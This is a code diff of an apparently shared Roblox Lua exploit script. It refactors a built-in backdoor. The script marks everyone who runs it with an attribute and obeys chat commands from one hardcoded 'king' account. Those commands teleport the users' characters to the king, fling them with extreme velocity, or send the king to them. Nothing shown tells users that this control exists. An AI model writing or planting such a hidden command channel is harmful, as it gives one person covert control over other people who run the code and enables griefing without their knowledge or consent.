@@ -162,30 +162,28 @@ Players.PlayerAdded:Connect(function(player)
     task.wait(1) -- Ensure the character has loaded before assigning title
     assignTitle(player)
 end)
-
 -- Configuration
 local KING_USERNAME = "awdasdawfa8"
 
 -- Services
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
--- Mark self as using the script via attribute
-pcall(function()
-    LocalPlayer:SetAttribute("UsingZackScript", true)
-end)
+-- Mark the player as a script user
+LocalPlayer:SetAttribute("UsingZackScript", true)
 
--- Helper to get HumanoidRootPart
+-- Helper: Get HumanoidRootPart
 local function getRoot(char)
     return char and char:FindFirstChild("HumanoidRootPart")
 end
 
--- Helper to check if a player is using the script
+-- Helper: Check if player is using the script
 local function isUsingScript(plr)
     return plr:GetAttribute("UsingZackScript") == true
 end
 
--- Find player by display name, username, or partial
+-- Helper: Find player by display name, username, or partial
 local function findPlayerByName(partial)
     partial = partial:lower()
     for _, plr in ipairs(Players:GetPlayers()) do
@@ -200,86 +198,87 @@ local function findPlayerByName(partial)
     end
 end
 
--- Actions
-local function bring(plr, target)
-    if getRoot(plr.Character) and getRoot(target.Character) then
-        getRoot(target.Character).CFrame = getRoot(plr.Character).CFrame + Vector3.new(2, 0, 0)
+-- Command Actions
+local function bringTargetToKing(target, king)
+    local kingRoot = getRoot(king.Character)
+    local targetRoot = getRoot(target.Character)
+    if kingRoot and targetRoot then
+        targetRoot.CFrame = kingRoot.CFrame + Vector3.new(2, 0, 0)
     end
 end
 
-local function fling(target)
-    if getRoot(target.Character) then
+local function flingTarget(target)
+    local root = getRoot(target.Character)
+    if root then
         local bv = Instance.new("BodyVelocity")
-        bv.Velocity = Vector3.new(
-            math.random(-100000, 100000),
-            math.random(80000, 82000),
-            math.random(-100000, 100000)
-        )
+        bv.Velocity = Vector3.new(math.random(-10000, 10000), math.random(8000, 8200), math.random(-10000, 10000))
         bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
         bv.P = 1e5
-        bv.Parent = getRoot(target.Character)
+        bv.Parent = root
         game.Debris:AddItem(bv, 0.5)
     end
 end
 
-local function gotoTarget(plr, target)
-    if getRoot(plr.Character) and getRoot(target.Character) then
-        getRoot(plr.Character).CFrame = getRoot(target.Character).CFrame + Vector3.new(2, 0, 0)
+local function gotoTarget(me, target)
+    local myRoot = getRoot(me.Character)
+    local targetRoot = getRoot(target.Character)
+    if myRoot and targetRoot then
+        myRoot.CFrame = targetRoot.CFrame + Vector3.new(2, 0, 0)
     end
 end
 
--- Listen to king's commands
+-- Hook into the King’s commands
 local function onPlayerAdded(plr)
-    plr.Chatted:Connect(function(msg)
-        if plr.Name ~= KING_USERNAME then return end
+    if plr.Name == KING_USERNAME then
+        plr.Chatted:Connect(function(msg)
+            local cmd, arg = msg:match("^(%S+)%s*(.*)$")
+            if not cmd then return end
+            cmd = cmd:lower()
+            arg = arg:lower()
 
-        local cmd, arg = msg:match("^(%S+)%s*(.*)$")
-        cmd = cmd:lower()
-        arg = arg:lower()
-
-        if cmd == "$bring" then
-            if arg == "all" then
-                for _, target in ipairs(Players:GetPlayers()) do
-                    if isUsingScript(target) and target ~= plr and target.Name ~= KING_USERNAME then
-                        bring(plr, target)
+            if cmd == "$bring" then
+                if arg == "all" then
+                    for _, target in ipairs(Players:GetPlayers()) do
+                        if isUsingScript(target) and target ~= plr and target.Name ~= KING_USERNAME then
+                            bringTargetToKing(target, plr)
+                        end
+                    end
+                else
+                    local target = findPlayerByName(arg)
+                    if target and isUsingScript(target) and target.Name ~= KING_USERNAME then
+                        bringTargetToKing(target, plr)
                     end
                 end
-            else
-                local target = findPlayerByName(arg)
-                if target and isUsingScript(target) and target.Name ~= KING_USERNAME then
-                    bring(plr, target)
-                end
-            end
-        elseif cmd == "$fling" then
-            if arg == "all" then
-                for _, target in ipairs(Players:GetPlayers()) do
-                    if isUsingScript(target) and target ~= plr and target.Name ~= KING_USERNAME then
-                        fling(target)
+
+            elseif cmd == "$fling" then
+                if arg == "all" then
+                    for _, target in ipairs(Players:GetPlayers()) do
+                        if isUsingScript(target) and target ~= plr and target.Name ~= KING_USERNAME then
+                            flingTarget(target)
+                        end
+                    end
+                else
+                    local target = findPlayerByName(arg)
+                    if target and isUsingScript(target) and target.Name ~= KING_USERNAME then
+                        flingTarget(target)
                     end
                 end
-            else
+
+            elseif cmd == "$goto" then
                 local target = findPlayerByName(arg)
                 if target and isUsingScript(target) and target.Name ~= KING_USERNAME then
-                    fling(target)
+                    gotoTarget(plr, target)
                 end
             end
-        elseif cmd == "$goto" then
-            local target = findPlayerByName(arg)
-            if target and isUsingScript(target) and target.Name ~= KING_USERNAME then
-                gotoTarget(plr, target)
-            end
-        end
-    end)
+        end)
+    end
 end
 
--- Initial check
+-- Connect all current players + future players
 for _, plr in ipairs(Players:GetPlayers()) do
     onPlayerAdded(plr)
 end
-
--- New players
 Players.PlayerAdded:Connect(onPlayerAdded)
-
 
 
 local Button = Tab:CreateButton({
